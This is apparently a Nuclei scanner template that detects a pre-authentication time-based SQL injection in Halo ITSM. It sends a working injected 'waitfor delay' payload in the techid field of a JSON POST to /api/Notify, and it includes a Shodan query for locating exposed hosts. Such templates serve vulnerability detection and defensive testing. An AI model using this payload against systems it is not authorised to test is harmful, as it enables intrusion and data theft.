id: halo-tism-sqli

info:
  name: Halo ITSM - Pre-Authentication SQL Injection
  author: rootxharsh,iamnoooob,pdresearch
  severity: critical
  description: |
    A Time-Based SQL Injection vulnerability in Halo ITSM allows unauthenticated attackers to execute malicious SQL queries by leveraging time delays, potentially leading to data exfiltration, privilege escalation, or full system compromise.
  reference:
    - https://slcyber.io/assetnote-security-research-center/loose-types-sink-ships-pre-authentication-sql-injection-in-halo-itsm/
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:489905671
  tags: halo,itsm,sqli,time-based-sqli

variables:
  string: "{{rand_text_numeric(10)}}"

http:
  - raw:
      - |
        @timeout: 20s
        POST /api/Notify HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "sessionid": "{{randstr}}",
          "tracking0": "{{string}}",
          "techid": "1;waitfor delay '0:0:6'--",
          "pickuptime": "2025-03-03T10:00:00",
          "lastactiontime": "2025-03-03T10:00:00",
          "chatlog": "{{randstr}}"
        }

    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code == 200'
          - 'contains(body, "ok")'
        condition: and
# digest: 4a0a00473045022009f70839843149c2129b7655d2481f4eb3053761c49b9e1e93844150a0926c9b022100f0d325d2847cbe9c8c085fb52c2f41f82787ee5c186300368c79b1c28a66bd27:922c64590222798bb761d5b6d8e72950